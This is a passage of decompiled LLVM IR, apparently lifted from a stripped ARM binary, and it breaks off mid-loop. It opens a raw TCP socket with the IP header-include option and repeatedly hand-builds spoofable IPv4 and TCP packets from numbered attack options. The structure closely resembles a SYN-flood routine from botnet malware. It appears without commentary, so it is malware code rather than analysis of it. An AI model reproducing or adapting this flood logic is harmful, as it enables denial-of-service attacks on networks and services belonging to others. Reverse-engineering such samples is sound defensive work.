  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_dd8c = load i32, i32* @r4, align 4
  %v6_dd8c = load i32, i32* @r5, align 4
  %v9_dd8c = load i32, i32* @r6, align 4
  %v12_dd8c = load i32, i32* @r7, align 4
  %v1_dd90 = urem i32 %arg1, 256
  store i32 %v1_dd90, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_dd90, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_dda8 = urem i32 %arg3, 256
  store i32 %v1_dda8, i32* @r4, align 4
  %v2_ddac = call i32 @_calloc(i32 %v1_dd90, i32 4)
  %v0_ddb0 = load i32, i32* @r5, align 4
  store i32 %v0_ddb0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_ddac, i32* %fp.global-to-local, align 4
  %v0_ddc0 = load i32, i32* @r4, align 4
  store i32 %v0_ddc0, i32* %r0.global-to-local, align 4
  %v4_ddc4 = inttoptr i32 %v0_ddb0 to i32*
  %v5_ddc4 = call i32 @function_b240(i32 %v0_ddc0, i32* %v4_ddc4, i32 2, i32 0)
  %v1_ddd0 = urem i32 %v5_ddc4, 256
  store i32 %v1_ddd0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_dddc = load i32, i32* @r5, align 4
  store i32 %v0_dddc, i32* %r1.global-to-local, align 4
  %v0_dde0 = load i32, i32* @r4, align 4
  store i32 %v0_dde0, i32* %r0.global-to-local, align 4
  %v5_dde4 = trunc i32 %v5_ddc4 to i8
  %v6_dde8 = inttoptr i32 %v0_dddc to i32*
  %v7_dde8 = call i32 @function_b240(i32 %v0_dde0, i32* %v6_dde8, i32 3, i32 65535)
  %v0_ddec = load i32, i32* @r5, align 4
  store i32 %v0_ddec, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_ddfc = load i32, i32* @r4, align 4
  store i32 %v0_ddfc, i32* %r0.global-to-local, align 4
  %v5_de00 = inttoptr i32 %v0_ddec to i32*
  %v6_de00 = call i32 @function_b240(i32 %v0_ddfc, i32* %v5_de00, i32 4, i32 64)
  %v1_de08 = urem i32 %v6_de00, 256
  store i32 %v1_de08, i32* %ip.global-to-local, align 4
  %v0_de0c = load i32, i32* @r5, align 4
  store i32 %v0_de0c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_de18 = load i32, i32* @r4, align 4
  store i32 %v0_de18, i32* %r0.global-to-local, align 4
  %v6_de20 = inttoptr i32 %v0_de0c to i32*
  %v7_de20 = call i32 @function_b240(i32 %v0_de18, i32* %v6_de20, i32 5, i32 1)
  %v1_de2c = urem i32 %v7_de20, 256
  store i32 %v1_de2c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_de38 = load i32, i32* @r5, align 4
  store i32 %v0_de38, i32* %r1.global-to-local, align 4
  %v0_de3c = load i32, i32* @r4, align 4
  store i32 %v0_de3c, i32* %r0.global-to-local, align 4
  %v5_de44 = inttoptr i32 %v0_de38 to i32*
  %v6_de44 = call i32 @function_b240(i32 %v0_de3c, i32* %v5_de44, i32 6, i32 65535)
  %v0_de4c = load i32, i32* @r5, align 4
  store i32 %v0_de4c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_de44, i32* @r7, align 4
  %v0_de5c = load i32, i32* @r4, align 4
  store i32 %v0_de5c, i32* %r0.global-to-local, align 4
  %v4_de60 = inttoptr i32 %v0_de4c to i32*
  %v5_de60 = call i32 @function_b240(i32 %v0_de5c, i32* %v4_de60, i32 7, i32 65535)
  %v0_de68 = load i32, i32* @r5, align 4
  store i32 %v0_de68, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_de60, i32* @r6, align 4
  %v0_de78 = load i32, i32* @r4, align 4
  store i32 %v0_de78, i32* %r0.global-to-local, align 4
  %v4_de7c = inttoptr i32 %v0_de68 to i32*
  %v5_de7c = call i32 @function_b240(i32 %v0_de78, i32* %v4_de7c, i32 17, i32 65535)
  %v0_de80 = load i32, i32* @r5, align 4
  store i32 %v0_de80, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_de90 = load i32, i32* @r4, align 4
  store i32 %v0_de90, i32* %r0.global-to-local, align 4
  %v5_de94 = inttoptr i32 %v0_de80 to i32*
  %v6_de94 = call i32 @function_b240(i32 %v0_de90, i32* %v5_de94, i32 18, i32 0)
  %v0_de98 = load i32, i32* @r5, align 4
  store i32 %v0_de98, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_dea8 = load i32, i32* @r4, align 4
  store i32 %v0_dea8, i32* %r0.global-to-local, align 4
  %v5_deac = inttoptr i32 %v0_de98 to i32*
  %v6_deac = call i32 @function_b240(i32 %v0_dea8, i32* %v5_deac, i32 11, i32 0)
  %v0_deb0 = load i32, i32* @r5, align 4
  store i32 %v0_deb0, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_dec0 = load i32, i32* @r4, align 4
  store i32 %v0_dec0, i32* %r0.global-to-local, align 4
  %v5_dec4 = inttoptr i32 %v0_deb0 to i32*
  %v6_dec4 = call i32 @function_b240(i32 %v0_dec0, i32* %v5_dec4, i32 12, i32 0)
  %v0_dec8 = load i32, i32* @r5, align 4
  store i32 %v0_dec8, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ded8 = load i32, i32* @r4, align 4
  store i32 %v0_ded8, i32* %r0.global-to-local, align 4
  %v5_dedc = inttoptr i32 %v0_dec8 to i32*
  %v6_dedc = call i32 @function_b240(i32 %v0_ded8, i32* %v5_dedc, i32 13, i32 0)
  %v0_dee0 = load i32, i32* @r5, align 4
  store i32 %v0_dee0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_def0 = load i32, i32* @r4, align 4
  store i32 %v0_def0, i32* %r0.global-to-local, align 4
  %v5_def4 = inttoptr i32 %v0_dee0 to i32*
  %v6_def4 = call i32 @function_b240(i32 %v0_def0, i32* %v5_def4, i32 14, i32 0)
  %v0_def8 = load i32, i32* @r5, align 4
  store i32 %v0_def8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_df08 = load i32, i32* @r4, align 4
  store i32 %v0_df08, i32* %r0.global-to-local, align 4
  %v5_df0c = inttoptr i32 %v0_def8 to i32*
  %v6_df0c = call i32 @function_b240(i32 %v0_df08, i32* %v5_df0c, i32 15, i32 1)
  %v0_df10 = load i32, i32* @r5, align 4
  store i32 %v0_df10, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_df20 = load i32, i32* @r4, align 4
  store i32 %v0_df20, i32* %r0.global-to-local, align 4
  %v5_df24 = inttoptr i32 %v0_df10 to i32*
  %v6_df24 = call i32 @function_b240(i32 %v0_df20, i32* %v5_df24, i32 16, i32 0)
  %v2_df30 = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_df30, i32* %r3.global-to-local, align 4
  %v0_df34 = load i32, i32* @r5, align 4
  store i32 %v0_df34, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_df3c = load i32, i32* @r4, align 4
  store i32 %v0_df3c, i32* %r0.global-to-local, align 4
  %v5_df40 = inttoptr i32 %v0_df34 to i32*
  %v6_df40 = call i32 @function_b1d4(i32 %v0_df3c, i32* %v5_df40, i32 25, i32 %v2_df30, i32 %v6_df24)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_df54 = call i32 @_socket(i32 2, i32 3, i32 6)
  store i32 %v3_df54, i32* %r0.global-to-local, align 4
  %v7_df58 = icmp eq i32 %v3_df54, -1
  store i1 %v7_df58, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_df54, i32* %sb.global-to-local, align 4
  br i1 %v7_df58, label %dec_label_pc_e4c4, label %dec_label_pc_df64

dec_label_pc_df64:                                ; preds = %dec_label_pc_dd8c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_df6c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_df6c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_df80 = call i32 @_setsockopt(i32 %v3_df54, i32 0, i32 3, i32 %v6_df6c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_df80, i32* %r0.global-to-local, align 4
  %v7_df84 = icmp eq i32 %v5_df80, -1
  store i1 %v7_df84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_df84, label %dec_label_pc_e4bc, label %dec_label_pc_df8c

dec_label_pc_df8c:                                ; preds = %dec_label_pc_df64
  store i32 0, i32* %stack_var_-40, align 4
  %v0_dfa0 = load i32, i32* @r7, align 4
  %v3_dfa0 = mul i32 %v0_dfa0, 65536
  store i32 %v3_dfa0, i32* %r4.global-to-local, align 4
  %v0_dfa4 = load i32, i32* @r6, align 4
  %v3_dfa4 = mul i32 %v0_dfa4, 65536
  store i32 %v3_dfa4, i32* %r5.global-to-local, align 4
  %v3_dfa8 = urem i32 %v7_dde8, 65536
  store i32 %v3_dfa8, i32* %r3.global-to-local, align 4
  %v3_dfac = urem i32 %v0_dfa0, 65536
  store i32 %v3_dfac, i32* %ip.global-to-local, align 4
  %v3_dfb0 = urem i32 %v0_dfa4, 65536
  store i32 %v3_dfb0, i32* %r0.global-to-local, align 4
  %v1_dfb4 = urem i32 %v6_deac, 256
  store i32 %v1_dfb4, i32* %r2.global-to-local, align 4
  %v0_dfb8 = load i32, i32* @sl, align 4
  %v2_dfb8 = icmp eq i32 %v0_dfb8, 0
  store i1 %v2_dfb8, i1* %cpsr_z.global-to-local, align 1
  %tmp69 = icmp slt i32 %v0_dfb8, 1
  br i1 %tmp69, label %dec_label_pc_e268, label %dec_label_pc_dfd0

dec_label_pc_dfd0:                                ; preds = %dec_label_pc_df8c
  %v1_dfe0 = urem i32 %v0_dfa0, 256
  %v1_dfe8 = urem i32 %v7_dde8, 256
  %v1_dfec = urem i32 %v0_dfa4, 256
  %tmp70 = mul i32 %v5_de7c, 256
  %v3_dff4 = mul nuw nsw i32 %v1_dfec, 256
  %v1_dff8 = and i32 %tmp70, 65280
  %tmp71 = udiv i32 %v0_dfa4, 256
  %v4_dffc = urem i32 %tmp71, 256
  %v5_dffc = or i32 %v4_dffc, %v3_dff4
  store i32 %v5_dffc, i32* %r6.global-to-local, align 4
  %tmp72 = udiv i32 %v5_de7c, 256
  %v4_e000 = urem i32 %tmp72, 256
  %v5_e000 = or i32 %v4_e000, %v1_dff8
  store i32 %v5_e000, i32* %r5.global-to-local, align 4
  %v1_e010 = urem i32 %v6_deac, 2
  %tmp73 = udiv i32 %v7_dde8, 256
  %v1_e018 = urem i32 %v6_dec4, 2
  %v3_e028 = mul nuw nsw i32 %v1_dfe0, 256
  store i32 %v3_e028, i32* %r1.global-to-local, align 4
  %tmp74 = udiv i32 %v0_dfa0, 256
  %v4_e034 = urem i32 %tmp74, 256
  %v5_e034 = or i32 %v4_e034, %v3_e028
  store i32 %v5_e034, i32* %r7.global-to-local, align 4
  %v1_e038 = urem i32 %v6_dedc, 2
  %v1_e03c = urem i32 %v6_def4, 2
  %v1_e040 = urem i32 %v6_df0c, 2
  %v1_e050 = urem i32 %v6_df24, 2
  store i32 %v1_e050, i32* %r0.global-to-local, align 4
  store i32 %v1_dfe8, i32* %r2.global-to-local, align 4
  store i32 %v1_dfe0, i32* %r3.global-to-local, align 4
  store i32 %v1_dfec, i32* %ip.global-to-local, align 4
  %v5_e060 = trunc i32 %tmp73 to i8
  %v5_e070 = trunc i32 %v0_dfa4 to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %sext = mul i32 %v6_de00, 16777216
  %v4_e0c0 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v7_dde8, 16777216
  %v4_e0d8 = sdiv i32 %sext8, 16777216
  %tmp = sub nsw i32 0, %v1_e010
  %v4_e134 = and i32 %tmp, 32
  %tmp78 = sub nsw i32 0, %v1_e018
  %v4_e148 = and i32 %tmp78, 16
  %tmp79 = sub nsw i32 0, %v1_e038
  %v4_e15c = and i32 %tmp79, 8
  %tmp80 = sub nsw i32 0, %v1_e03c
  %v4_e170 = and i32 %tmp80, 4
  %tmp81 = sub nsw i32 0, %v1_e040
  %v3_e184 = and i32 %tmp81, 2
  %v7_e1b4 = sext i8 %v5_e070 to i32
  %sext77 = mul i32 %v0_dfa0, 16777216
  %v3_e1b4 = sdiv i32 %sext77, 16777216
  br label %dec_label_pc_e078

dec_label_pc_e078:                                ; preds = %bb76, %dec_label_pc_dfd0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_e080 = call i32 @_calloc(i32 128, i32 1)
  store i32 %v2_e080, i32* %r0.global-to-local, align 4
  %v3_e084 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e084, i32* %r2.global-to-local, align 4
  %v1_e088 = load i32, i32* %fp.global-to-local, align 4
  %v2_e088 = load i32, i32* %r4.global-to-local, align 4
  %v5_e088 = mul i32 %v2_e088, 4
  %v6_e088 = add i32 %v5_e088, %v1_e088
  %v7_e088 = inttoptr i32 %v6_e088 to i32*
  store i32 %v2_e080, i32* %v7_e088, align 4
  %v0_e08c = load i32, i32* %fp.global-to-local, align 4
  %v1_e08c = load i32, i32* %r2.global-to-local, align 4
  %v4_e08c = mul i32 %v1_e08c, 4
  %v5_e08c = add i32 %v4_e08c, %v0_e08c
  %v6_e08c = inttoptr i32 %v5_e08c to i32*
  %v7_e08c = load i32, i32* %v6_e08c, align 4
  store i32 %v7_e08c, i32* %r4.global-to-local, align 4
  %v1_e090 = inttoptr i32 %v7_e08c to i8*
  %v2_e090 = load i8, i8* %v1_e090, align 1
  %tmp82 = urem i8 %v2_e090, 16
  %v1_e094 = zext i8 %tmp82 to i32
  %v1_e098 = or i32 %v1_e094, 64
  store i32 %v1_e098, i32* %r3.global-to-local, align 4
  %v1_e09c = trunc i32 %v1_e098 to i8
  store i8 %v1_e09c, i8* %v1_e090, align 1
  %v0_e0a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_e0a0 = inttoptr i32 %v0_e0a0 to i8*
  %v2_e0a0 = load i8, i8* %v1_e0a0, align 1
  %v1_e0a4 = and i8 %v2_e0a0, -16
  %v1_e0a8 = or i8 %v1_e0a4, 5
  store i32 %v1_de2c, i32* %r0.global-to-local, align 4
  store i8 %v1_e0a8, i8* %v1_e0a0, align 1
  %v2_e0b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_e0b8 = add i32 %v2_e0b8, 1
  %v4_e0b8 = inttoptr i32 %v3_e0b8 to i8*
  store i8 %v5_dde4, i8* %v4_e0b8, align 1
  store i32 %v4_e0c0, i32* %r2.global-to-local, align 4
  %v2_e0c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_e0c4 = add i32 %v2_e0c4, 4
  %v4_e0c4 = inttoptr i32 %v3_e0c4 to i8*
  store i8 %v5_e060, i8* %v4_e0c4, align 1
  store i32 6, i32* %ip.global-to-local, align 4
  %v0_e0d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_e0d0 = icmp eq i32 %v0_e0d0, 0
  store i1 %v2_e0d0, i1* %cpsr_z.global-to-local, align 1
  %v2_e0d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_e0d4 = add i32 %v2_e0d4, 3
  %v4_e0d4 = inttoptr i32 %v3_e0d4 to i8*
  store i8 60, i8* %v4_e0d4, align 1
  store i32 %v4_e0d8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_e0e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0e0 = trunc i32 %v0_e0e0 to i8
  %v2_e0e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_e0e0 = add i32 %v2_e0e0, 8
  %v4_e0e0 = inttoptr i32 %v3_e0e0 to i8*
  store i8 %v1_e0e0, i8* %v4_e0e0, align 1
  %v0_e0e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e0e4 = trunc i32 %v0_e0e4 to i8
  %v2_e0e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_e0e4 = add i32 %v2_e0e4, 9
  %v4_e0e4 = inttoptr i32 %v3_e0e4 to i8*
  store i8 %v1_e0e4, i8* %v4_e0e4, align 1
  %v0_e0e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e0e8 = trunc i32 %v0_e0e8 to i8
  %v2_e0e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_e0e8 = add i32 %v2_e0e8, 2
  %v4_e0e8 = inttoptr i32 %v3_e0e8 to i8*
  store i8 %v1_e0e8, i8* %v4_e0e8, align 1
  %v3_e0ec = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e0ec, i32* %r2.global-to-local, align 4
  %v0_e0f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e0f0, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e078
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_e0f4 = load i32, i32* %r4.global-to-local, align 4
  %v4_e0f4 = add i32 %v3_e0f4, 6
  %v5_e0f4 = inttoptr i32 %v4_e0f4 to i8*
  store i8 64, i8* %v5_e0f4, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e078, %bb
  %v0_e0f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_e0f8 = trunc i32 %v0_e0f8 to i8
  %v2_e0f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_e0f8 = add i32 %v2_e0f8, 5
  %v4_e0f8 = inttoptr i32 %v3_e0f8 to i8*
  store i8 %v1_e0f8, i8* %v4_e0f8, align 1
  %v0_e0fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e0fc, label %.thread9, label %bb75

.thread9:                                         ; preds = %.thread
  store i32 %v6_df40, i32* %r0.global-to-local, align 4
  br label %bb76

bb75:                                             ; preds = %.thread
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v6_df40, i32* %r0.global-to-local, align 4
  %v3_e104 = load i32, i32* %r4.global-to-local, align 4
  %v4_e104 = add i32 %v3_e104, 7
  %v5_e104 = inttoptr i32 %v4_e104 to i8*
  store i8 0, i8* %v5_e104, align 1
  %v0_e10c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb76

bb76:                                             ; preds = %.thread9, %bb75
  %v0_e10c = phi i32 [ %v6_df40, %.thread9 ], [ %v0_e10c.pre, %bb75 ]
  %v0_e108 = load i32, i32* %r2.global-to-local, align 4
  %v3_e108 = mul i32 %v0_e108, 32
  store i32 %v3_e108, i32* %r3.global-to-local, align 4
  %v1_e10c = load i32, i32* %r4.global-to-local, align 4
  %v2_e10c = add i32 %v1_e10c, 12
  %v3_e10c = inttoptr i32 %v2_e10c to i32*
  store i32 %v0_e10c, i32* %v3_e10c, align 4
  %v0_e110 = load i32, i32* %r3.global-to-local, align 4
  %v1_e110 = load i32, i32* %r2.global-to-local, align 4
  %tmp83 = mul i32 %v1_e110, -8
  %v5_e110 = add i32 %v0_e110, %tmp83
  %v1_e114 = load i32, i32* @r8, align 4
  %v2_e114 = add i32 %v1_e114, %v5_e110
  store i32 %v2_e114, i32* %r3.global-to-local, align 4
  %v1_e118 = add i32 %v2_e114, 16
  %v2_e118 = inttoptr i32 %v1_e118 to i32*
  %v3_e118 = load i32, i32* %v2_e118, align 4
  store i32 %v3_e118, i32* %r2.global-to-local, align 4
  %v0_e11c = load i32, i32* %r7.global-to-local, align 4
  %v1_e11c = trunc i32 %v0_e11c to i8
  %v2_e11c = load i32, i32* %r4.global-to-local, align 4
  %v3_e11c = add i32 %v2_e11c, 20
  %v4_e11c = inttoptr i32 %v3_e11c to i8*
  store i8 %v1_e11c, i8* %v4_e11c, align 1
  %v0_e120 = load i32, i32* %r2.global-to-local, align 4
  %v1_e120 = load i32, i32* %r4.global-to-local, align 4
  %v2_e120 = add i32 %v1_e120, 16
  %v3_e120 = inttoptr i32 %v2_e120 to i32*
  store i32 %v0_e120, i32* %v3_e120, align 4
  %v0_e124 = load i32, i32* %r4.global-to-local, align 4
  %v1_e124 = add i32 %v0_e124, 20
  store i32 %v1_e124, i32* %r1.global-to-local, align 4
  %v1_e128 = add i32 %v0_e124, 33
  %v2_e128 = inttoptr i32 %v1_e128 to i8*
  %v3_e128 = load i8, i8* %v2_e128, align 1
  %v4_e128 = zext i8 %v3_e128 to i32
  store i32 %v1_e010, i32* %r2.global-to-local, align 4
  %v1_e130 = and i32 %v4_e128, 223
  %v5_e134 = or i32 %v1_e130, %v4_e134
  store i32 %v5_e134, i32* %r3.global-to-local, align 4
  %v1_e138 = trunc i32 %v5_e134 to i8
  store i8 %v1_e138, i8* %v2_e128, align 1
  %v0_e13c = load i32, i32* %r1.global-to-local, align 4
  %v1_e13c = add i32 %v0_e13c, 13
  %v2_e13c = inttoptr i32 %v1_e13c to i8*
  %v3_e13c = load i8, i8* %v2_e13c, align 1
  %v4_e13c = zext i8 %v3_e13c to i32
  store i32 %v1_e018, i32* %r3.global-to-local, align 4
  %v1_e144 = and i32 %v4_e13c, 239
  %v5_e148 = or i32 %v1_e144, %v4_e148
  store i32 %v5_e148, i32* %r2.global-to-local, align 4
  %v1_e14c = trunc i32 %v5_e148 to i8
  store i8 %v1_e14c, i8* %v2_e13c, align 1
  %v0_e150 = load i32, i32* %r1.global-to-local, align 4
  %v1_e150 = add i32 %v0_e150, 13
  %v2_e150 = inttoptr i32 %v1_e150 to i8*
  %v3_e150 = load i8, i8* %v2_e150, align 1
  %v4_e150 = zext i8 %v3_e150 to i32
  store i32 %v1_e038, i32* %ip.global-to-local, align 4
  %v1_e158 = and i32 %v4_e150, 247
  %v5_e15c = or i32 %v1_e158, %v4_e15c
  store i32 %v5_e15c, i32* %r3.global-to-local, align 4
  %v1_e160 = trunc i32 %v5_e15c to i8
  store i8 %v1_e160, i8* %v2_e150, align 1
  %v0_e164 = load i32, i32* %r1.global-to-local, align 4
  %v1_e164 = add i32 %v0_e164, 13
  %v2_e164 = inttoptr i32 %v1_e164 to i8*
  %v3_e164 = load i8, i8* %v2_e164, align 1
  %v4_e164 = zext i8 %v3_e164 to i32
  store i32 %v1_e03c, i32* %r0.global-to-local, align 4
  %v1_e16c = and i32 %v4_e164, 251
  %v5_e170 = or i32 %v1_e16c, %v4_e170
  store i32 %v5_e170, i32* %r2.global-to-local, align 4
  %v1_e174 = trunc i32 %v5_e170 to i8
  store i8 %v1_e174, i8* %v2_e164, align 1
  %v0_e178 = load i32, i32* %r1.global-to-local, align 4
  %v1_e178 = add i32 %v0_e178, 13
  %v2_e178 = inttoptr i32 %v1_e178 to i8*
  %v3_e178 = load i8, i8* %v2_e178, align 1
  %v4_e178 = zext i8 %v3_e178 to i32
  store i32 %v1_e040, i32* %r2.global-to-local, align 4
  %v1_e180 = and i32 %v4_e178, 253
  %v4_e184 = or i32 %v1_e180, %v3_e184
  store i32 %v4_e184, i32* %r3.global-to-local, align 4
  %v1_e188 = trunc i32 %v4_e184 to i8
  store i8 %v1_e188, i8* %v2_e178, align 1
  %v0_e18c = load i32, i32* %r1.global-to-local, align 4
  %v1_e18c = add i32 %v0_e18c, 12
  %v2_e18c = inttoptr i32 %v1_e18c to i8*
  %v3_e18c = load i8, i8* %v2_e18c, align 1
  %v4_e18c = zext i8 %v3_e18c to i32
  store i32 %v4_e18c, i32* %r2.global-to-local, align 4
  %v1_e190 = add i32 %v0_e18c, 13
  %v2_e190 = inttoptr i32 %v1_e190 to i8*
  %v3_e190 = load i8, i8* %v2_e190, align 1
  %v4_e190 = zext i8 %v3_e190 to i32
  %tmp84 = urem i8 %v3_e18c, 16
  %v1_e198 = zext i8 %tmp84 to i32
  %v1_e19c = and i32 %v4_e190, 254
  %v2_e1a0 = or i32 %v1_e19c, %v1_e050
  %v1_e1a4 = or i32 %v1_e198, 160
  store i32 %v1_e1a4, i32* %r2.global-to-local, align 4
  %v1_e1a8 = trunc i32 %v2_e1a0 to i8
  store i8 %v1_e1a8, i8* %v2_e190, align 1
  %v0_e1ac = load i32, i32* %r2.global-to-local, align 4
  %v1_e1ac = trunc i32 %v0_e1ac to i8
  %v2_e1ac = load i32, i32* %r1.global-to-local, align 4
  %v3_e1ac = add i32 %v2_e1ac, 12
  %v4_e1ac = inttoptr i32 %v3_e1ac to i8*
  store i8 %v1_e1ac, i8* %v4_e1ac, align 1
  store i32 %v3_e1b4, i32* %r0.global-to-local, align 4
  store i32 %v7_e1b4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_e1c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_e1c0 = add i32 %v2_e1c0, 3
  %v4_e1c0 = inttoptr i32 %v3_e1c0 to i8*
  store i8 %v5_e070, i8* %v4_e1c0, align 1
  %v0_e1c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_e1c4 = trunc i32 %v0_e1c4 to i8
  %v2_e1c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_e1c4 = add i32 %v2_e1c4, 1
  %v4_e1c4 = inttoptr i32 %v3_e1c4 to i8*
  store i8 %v1_e1c4, i8* %v4_e1c4, align 1
  %v0_e1c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_e1c8 = trunc i32 %v0_e1c8 to i8
  %v2_e1c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e1c8 = add i32 %v2_e1c8, 2
  %v4_e1c8 = inttoptr i32 %v3_e1c8 to i8*
  store i8 %v1_e1c8, i8* %v4_e1c8, align 1
  %v0_e1cc = load i32, i32* %r5.global-to-local, align 4
  %v1_e1cc = load i32, i32* %r1.global-to-local, align 4
  %v2_e1cc = add i32 %v1_e1cc, 4
  %v3_e1cc = inttoptr i32 %v2_e1cc to i32*
  store i32 %v0_e1cc, i32* %v3_e1cc, align 4
  %v0_e1d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_e1d0 = trunc i32 %v0_e1d0 to i8
  %v2_e1d0 = load i32, i32* %r4.global-to-local, align 4
  %v3_e1d0 = add i32 %v2_e1d0, 41
  %v4_e1d0 = inttoptr i32 %v3_e1d0 to i8*
  store i8 %v1_e1d0, i8* %v4_e1d0, align 1
  %v0_e1d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1d4 = trunc i32 %v0_e1d4 to i8
  %v2_e1d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_e1d4 = add i32 %v2_e1d4, 40
  %v4_e1d4 = inttoptr i32 %v3_e1d4 to i8*
  store i8 %v1_e1d4, i8* %v4_e1d4, align 1
  %v0_e1d8 = call i32 @function_117dc()
  %v1_e1dc = mul i32 %v0_e1d8, 256
  %v1_e1e0 = and i32 %v1_e1dc, 3840
  %v1_e1e4 = or i32 %v1_e1e0, 28672
  %v3_e1ec = add nuw nsw i32 %v1_e1e4, 2048
  %v3_e1f87 = udiv i32 %v3_e1ec, 256
  store i32 %v3_e1f87, i32* %r1.global-to-local, align 4
  %v0_e1fc = load i32, i32* %r4.global-to-local, align 4
  %v1_e1fc = add i32 %v0_e1fc, 42
  store i32 %v1_e1fc, i32* %r2.global-to-local, align 4
  %v4_e200 = inttoptr i32 %v1_e1fc to i8*
  store i8 5, i8* %v4_e200, align 1
  %v0_e204 = load i32, i32* %r1.global-to-local, align 4
  %v1_e204 = trunc i32 %v0_e204 to i8
  %v2_e204 = load i32, i32* %r2.global-to-local, align 4
  %v3_e204 = add i32 %v2_e204, 1
  %v4_e204 = inttoptr i32 %v3_e204 to i8*
  store i8 %v1_e204, i8* %v4_e204, align 1
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_e210 = load i32, i32* %r4.global-to-local, align 4
  %v3_e210 = add i32 %v2_e210, 47
  %v4_e210 = inttoptr i32 %v3_e210 to i8*
  store i8 10, i8* %v4_e210, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
